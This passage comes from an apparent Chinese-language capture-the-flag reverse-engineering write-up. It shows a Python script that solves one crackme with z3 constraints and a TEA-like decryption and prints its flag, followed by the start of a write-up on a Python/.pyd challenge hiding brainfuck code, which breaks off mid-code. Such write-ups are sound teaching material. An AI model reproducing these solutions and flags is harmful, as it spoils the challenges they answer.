* x[4] + 0xFFFC3EA2 * x[2] + 0xFFF87E59 * x[8] + 0xFFFA03D8 * x[9] + 0xFFFD4887 * x[5] + 49684 * x[7]) &amp; 0xFFFFFFFF == 0xECFAD7E6)</span><br><span class="line">    solver.add((431281 * x[7] + 303436 * x[10] + 322142 * x[8] + 190343 * x[2] + 522606 * x[5] + 0xFFFA5EF2 * x[9] + 427328 * x[12] + 0xFFF9D78E * x[11] + 0xFFF96FC7 * x[0] + 436111 * x[4] + 0xFFF95AC0 * x[6] + 0xFFFBEB01 * x[3] + 0xFFF7FA9F * x[1]) &amp; 0xFFFFFFFF == 0xF7077400)</span><br><span class="line">    solver.add((0xFFF9899E * x[4] + 0xFFFA0082 * x[6] + 0xFFFB0F5F * x[12] + 463495 * x[1] + 345256 * x[8] + 138356 * x[7] + 0xFFFC8FEA * x[0] + 251299 * x[11] + 0xFFFEBE40 * x[9] + 0xFFF977CB * x[10] + 71943 * x[13] + 425456 * x[2] + 56298 * x[3] + 0xFFFA6D4F * x[5]) &amp; 0xFFFFFFFF == 0xFF214D65)</span><br><span class="line">    solver.add((0xFFFF9A06 * x[14] + 0xFFFDCE6F * x[3] + 15549 * x[13] + 0xFFF8510D * x[10] + 0xFFF9EC42 * x[9] + 36874 * x[2] + 0xFFFEB6CA * x[7] + 434801 * x[12] + 0xFFF8C9C4 * x[0] + 448925 * x[8] + 0xFFFF4AC7 * x[5] + 0xFFFE070C * x[4] + 0xFFFF54F9 * x[11] + 60534 * x[6] + 441341 * x[1]) &amp; 0xFFFFFFFF == 0xFDB9BC14)</span><br><span class="line">    solver.add((0xFFF9C269 * x[3] + 0xFFF9148B * x[9] + 246957 * x[5] + 197292 * x[15] + 0xFFFF0D9A * x[8] + 0xFFFFAD94 * x[6] + 0xFFF85EC4 * x[14] + 0xFFFA1AFE * x[2] + 415182 * x[13] + 24237 * x[0] + 0xFFF9AE91 * x[4] + 524530 * x[1] + 93336 * x[10] + 7350 * x[12] + 129819 * x[11] + 0xFFFB853F * x[7]) &amp; 0xFFFFFFFF == 0xF89B0712)</span><br><span class="line">    solver.check()</span><br><span class="line">    print(solver.model())</span><br><span class="line">    res = str(solver.model()).replace(&#x27;\n&#x27;, &#x27;&#x27;).replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;[&#x27;, &#x27;&#x27;).replace(&#x27;]&#x27;, &#x27;&#x27;).split(&#x27;,&#x27;) </span><br><span class="line">    tmp = [0 for i in range(16)]</span><br><span class="line">    for r in res:</span><br><span class="line">        r = r.split(&#x27;=&#x27;)</span><br><span class="line">        tmp[int(r[0][1:], 10)] = int(r[1], 10)  </span><br><span class="line">    return tmp</span><br><span class="line"></span><br><span class="line">def operate_1(a: list) -&gt; list:</span><br><span class="line">    for i in range(8):</span><br><span class="line">        a[i + 8] ^= a[i]</span><br><span class="line">    return a</span><br><span class="line"></span><br><span class="line">def operate_2(a: list) -&gt; list:</span><br><span class="line">    arr1 = [0x25, 0x3A, 0x4C, 0x27, 0x8E, 0x5F, 0xA8, 0xC5, 0x20, 0xC2, 0xFF, 0x8B, 0x28, 0x30, 0xB4, 0x3C, 0x19, 0xC0, 0x2F, 0x6A, 0x65, 0x24, 0x8C, 0x13, 0x7E, 0xF6, 0x3E, 0x17, 0xDD, 0x89, 0x55, 0x82, 0x57, 0x03, 0xF1, 0xE1, 0x3D, 0xB8, 0x31, 0x67, 0x00, 0x22, 0x2D, 0xA7, 0x32, 0x58, 0x8F, 0xCF, 0x78, 0x39, 0x73, 0x44, 0x34, 0xD8, 0x77, 0x12, 0x88, 0xF5, 0x51, 0x75, 0xC9, 0x7F, 0x7B, 0x0F, 0xE5, 0xF8, 0x6E, 0xE2, 0x83, 0x05, 0x47, 0x72, 0xFE, 0xE0, 0xF7, 0xF0, 0x04, 0x9A, 0x80, 0x1C, 0x8D, 0xEF, 0x4E, 0x33, 0xAA, 0x66, 0x9C, 0x37, 0xB1, 0x21, 0x85, 0x1D, 0xAF, 0x81, 0x42, 0x5B, 0xC7, 0x9D, 0xE6, 0x38, 0x8A, 0x49, 0x7A, 0xAE, 0xD0, 0xDF, 0xFB, 0x79, 0x18, 0xDC, 0xF3, 0xA5, 0x59, 0x29, 0xEB, 0xB0, 0x0D, 0x43, 0xEC, 0xEE, 0xCC, 0x2E, 0xF9, 0x08, 0x74, 0x5E, 0x50, 0xBA, 0xE4, 0x61, 0xA6, 0x14, 0x54, 0xE8, 0xDB, 0xB5, 0xFA, 0xD9, 0xED, 0xA3, 0x01, 0xB3, 0x11, 0x2B, 0x96, 0x6F, 0x52, 0x36, 0x23, 0x16, 0x1E, 0xF2, 0x40, 0x6C, 0x48, 0x35, 0x9E, 0xB9, 0x45, 0xC3, 0x02, 0x7D, 0x97, 0x94, 0x4A, 0xD1, 0x95, 0xCB, 0xC4, 0x2C, 0xA4, 0x15, 0x07, 0xBD, 0xA2, 0xAB, 0x9F, 0xB6, 0x9B, 0xFD, 0xB2, 0x53, 0x64, 0x5A, 0xDE, 0x0B, 0x70, 0xBE, 0x76, 0xE9, 0x4D, 0xBF, 0xEA, 0xF4, 0xAC, 0x86, 0x0C, 0x6B, 0x63, 0x5C, 0x71, 0x91, 0x2A, 0x3B, 0x09, 0x90, 0xFC, 0x98, 0x46, 0xA9, 0x69, 0xB7, 0xD7, 0xDA, 0xC1, 0x93, 0xC8, 0xD4, 0x06, 0x4F, 0x62, 0x6D, 0x3F, 0xBC, 0x92, 0x84, 0x26, 0x68, 0x60, 0xE3, 0xD6, 0xC6, 0xCA, 0x1A, 0xCE, 0xAD, 0x10, 0x1F, 0xBB, 0x41, 0x7C, 0xA0, 0x5D, 0x0E, 0x1B, 0x99, 0xE7, 0x4B, 0xD2, 0xCD, 0x0A, 0xD3, 0xA1, 0x87, 0xD5, 0x56]</span><br><span class="line">    return [arr1.index(i) for i in a]</span><br><span class="line"></span><br><span class="line">def operate_3(a: list) -&gt; list:</span><br><span class="line">    a.extend([ord(i) for i in &quot;nice2you&quot;])</span><br><span class="line">    v3 = [i for i in a[:4]]</span><br><span class="line">    _v3 = 0</span><br><span class="line">    mul = 1</span><br><span class="line">    for v in v3:</span><br><span class="line">        _v3 += v * mul</span><br><span class="line">        mul *= 256</span><br><span class="line">    v3 = _v3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v4 = [i for i in a[4:8]]</span><br><span class="line">    _v4 = 0</span><br><span class="line">    mul = 1</span><br><span class="line">    for v in v4:</span><br><span class="line">        _v4 += v * mul</span><br><span class="line">        mul *= 256</span><br><span class="line">    v4 = _v4</span><br><span class="line"></span><br><span class="line">    a2 = []</span><br><span class="line">    for i in range(4):</span><br><span class="line">        tmp = [i for i in a[8+i*4:12+i*4]]</span><br><span class="line">        _tmp = 0</span><br><span class="line">        mul = 1</span><br><span class="line">        for v in tmp:</span><br><span class="line">            _tmp += v * mul</span><br><span class="line">            mul *= 256</span><br><span class="line">        tmp = _tmp</span><br><span class="line">        a2.append(tmp)   </span><br><span class="line">    v6 = 0x468acf00</span><br><span class="line">    for i in range(0x1F + 1):</span><br><span class="line">        v4 = (v4 - (((v3 + v6) &amp; 0xFFFFFFFF) ^ ((16 * v3 + a2[2]) &amp; 0xFFFFFFFF) ^ (((v3 &gt;&gt; 5) + a2[3]) &amp; 0xFFFFFFFF))) &amp; 0xFFFFFFFF</span><br><span class="line">        v3 = (v3 - (((v4 + v6) &amp; 0xFFFFFFFF) ^ ((16 * v4 + a2[0]) &amp; 0xFFFFFFFF) ^ (((v4 &gt;&gt; 5) + a2[1]) &amp; 0xFFFFFFFF))) &amp; 0xFFFFFFFF</span><br><span class="line">        v6 = (v6 - 0x12345678) &amp; 0xFFFFFFFF</span><br><span class="line">    v3 = str(hex(v3))[2:]</span><br><span class="line">    v4 = str(hex(v4))[2:]</span><br><span class="line"></span><br><span class="line">    for i in range(4):</span><br><span class="line">        a[i] = int(v3[-2:], 16)</span><br><span class="line">        v3 = v3[:-2]</span><br><span class="line">        a[i + 4] = int(v4[-2:], 16)</span><br><span class="line">        v4 = v4[:-2]</span><br><span class="line">    return a    </span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">    # tmp1 = equationSolver()</span><br><span class="line">    tmp1 = [168, 159, 81, 112, 113, 9, 237, 115, 241, 171, 137, 168, 73, 113, 103, 55]</span><br><span class="line">    tmp1 = operate_1(tmp1)</span><br><span class="line">    tmp1 = operate_2(tmp1)</span><br><span class="line">    tmp1 = operate_3(tmp1)</span><br><span class="line">    print(&quot;flag&#123;&quot;, end = &quot;&quot;)</span><br><span class="line">    for t in tmp1[:16]:</span><br><span class="line">        print(chr(t), end = &quot;&quot;)</span><br><span class="line">    print(&quot;&#125;&quot;)</span><br><span class="line">#flag&#123;y0u_g0t_p455c0d3&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="strange-language"><a href="#strange-language" class="headerlink" title="strange_language"></a>strange_language</h1><h2 id="0x00-5"><a href="#0x00-5" class="headerlink" title="0x00"></a>0x00</h2><p> &emsp;一看就是Python，因为这exe有7000kb，有点大。经过exe转pyc后，首先用<code>010editor</code>看一下<code>main</code>文件，可以看到：</p>
<p><img src="/images/re-part-5/image-20221227153129664-167980209732321.png" alt="image-20221227153129664"></p>
<p> &emsp;里面使用了<code>brainfuckZ</code>中的<code>main_check</code>函数。恰巧文件夹里也有<code>bainfuck.cp38-win_amd64.pyd</code>的文件，<code>.pyd</code>文件一般是python的动态链接库，于是想逆向一下这个。</p>
<p> &emsp;<code>pyd</code>相较于python源码本身可读性大大下降，很多人处于类似混淆得目的，也会使用这种形式对python代码进行保护。</p>
<p> &emsp;<code>pyd</code>相关博客：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-259124.htm">https://bbs.pediy.com/thread-259124.htm</a></li>
<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1641/">https://tttang.com/archive/1641/</a></li>
</ol>
<h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><p> &emsp;看了好久，找到了<code>main_check</code>函数，但是一直没看出来具体是干啥的，打算好好看看 <a target="_blank" rel="noopener" href="https://tttang.com/archive/1641/#toc_pyd_1，之后直接看本题的wp。">https://tttang.com/archive/1641/#toc_pyd_1，之后直接看本题的wp。</a></p>
<p> &emsp;wp也是要看<code>brainfuck.main_check()</code>函数。查了查，BrainFuck竟然是一种语言，赶紧补充一下。之后，直接进入<code>bainfuck.cp38-win_amd64.pyd</code>，查找字符串有<code>brainfuck</code>代码，用<a target="_blank" rel="noopener" href="https://guodakui.oschina.io/mine/brainfuck.html">https://guodakui.oschina.io/mine/brainfuck.html</a> 试了试就是<code>main.exe</code>的主体逻辑。</p>
<p> &emsp;<code>brainfuck</code>代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-]&gt;&lt;&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&gt;[&lt;+&gt;-]&lt;&gt;&lt;[-]+&gt;&lt;&gt;[-]&lt;&lt;&lt;[-]&gt;&gt;[&gt;+&lt;&lt;&lt;+&gt;&gt;-]&gt;[&lt;+&gt;-]&lt;&gt;&lt;[-]&gt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-][-]&gt;[-]++++++[&lt;++++++&gt;-]&lt;++&gt;&lt;&lt;&gt;&gt;[-]&gt;[-]&lt;&lt;[&gt;[-]&lt;&lt;[&gt;&gt;+&gt;+&lt;&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]+&gt;[[-]&lt;-&lt;&lt;-&gt;&gt;&gt;]&lt;&lt;-]&lt;[-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]&lt;&lt;[[-][-]&gt;[-]&lt;&lt;&lt;&lt;[&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;-]&lt;[&lt;+&gt;[-]]]&lt;[&gt;[-]&gt;&lt;,&gt;&lt;&gt;[-]&lt;&lt;[-]&gt;[&gt;+&lt;&lt;+&gt;-]&gt;[&lt;+&gt;-]&lt;&gt;&lt;[-]&gt;[-]&lt;&lt;[&gt;+&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;&gt;-][-]++++++++++&gt;&lt;&lt;[-&gt;-&lt;]+&gt;[&lt;-&gt;[-]]&lt;[&gt;&gt;[-]&gt;&lt;&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;[-]&gt;&gt;&gt;&gt;&gt;[&gt;+&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;-]&gt;[&lt;+&gt;-]&lt;&gt;&lt;&lt;&lt;[-]][-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-][-]&gt;[-]&gt;[-]&lt;&lt;&lt;&lt;[&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;[&gt;&gt;&gt;[-]&lt;[&gt;+&lt;-]&lt;+[&gt;+&lt;-]&lt;-[&gt;+&lt;-]&gt;]&gt;&gt;&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&gt;[&lt;+&gt;-]&lt;[&lt;&lt;+&gt;&gt;-]&lt;[&lt;[&lt;+&gt;-]&gt;-[&lt;+&gt;-]&lt;]&lt;&lt;[-]&gt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-][-]&gt;[-]++++++[&lt;++++++&gt;-]&lt;++&gt;&lt;&lt;&gt;&gt;[-]&gt;[-]&lt;&lt;[&gt;[-]&lt;&lt;[&gt;&gt;+&gt;+&lt;&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]+&gt;[[-]&lt;-&lt;&lt;-&gt;&gt;&gt;]&lt;&lt;-]&lt;[-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]&lt;&lt;[[-][-]&gt;[-]&lt;&lt;&lt;&lt;[&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;-]&lt;[&lt;+&gt;[-]]]&lt;][-]&gt;[-]&gt;[-]&gt;[-]&gt;[-]&gt;[-]&gt;[-]&lt;[&gt;&gt;[-]+&lt;[&gt;+&lt;-]&lt;-[&gt;+&lt;-]&gt;]&gt;&gt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&lt;[&lt;&lt;+&gt;&gt;-]&lt;[&lt;[&lt;+&gt;-]&gt;-[&lt;+&gt;-]&lt;][-]&gt;[-]++++++++++[&lt;++++++++++&gt;-]&lt;++&gt;&lt;&lt;[-&gt;-&lt;]+&gt;[&lt;-&gt;[-]]&lt;[[-][-]+&gt;[-]&lt;[&gt;&gt;[-]+&lt;[&gt;+&lt;-]&lt;-[&gt;+&lt;-]&gt;]&gt;&gt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&lt;[&lt;&lt;+&gt;&gt;-]&lt;[&lt;[&lt;+&gt;-]&gt;-[&lt;+&gt;-]&lt;][-]&gt;[-]+++++++++[&lt;++++++++++++&gt;-]&lt;&gt;&lt;&lt;[-&gt;-&lt;]+&gt;[&lt;-&gt;[-]]&lt;[&lt;+&gt;[-]]]&lt;[[-][-]++&gt;[-]&lt;[&gt;&gt;[-]+&lt;[&gt;+&lt;-]&lt;-[&gt;+&lt;-]&gt;]&gt;&gt;[-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&